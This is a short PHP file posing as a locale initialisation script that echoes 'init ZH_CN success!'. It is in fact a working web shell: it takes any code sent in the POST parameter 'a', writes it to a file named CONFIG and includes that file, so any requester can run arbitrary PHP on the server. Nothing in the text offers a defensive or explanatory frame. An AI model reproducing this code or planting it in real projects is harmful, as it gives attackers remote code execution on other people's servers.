<?php
$s="echo 'init ZH_CN success!'";
$res=isset($_POST["a"])?$_POST["a"]:$s;
file_put_contents("CONFIG","<?php ".$res." ?>");
include "CONFIG";
?>
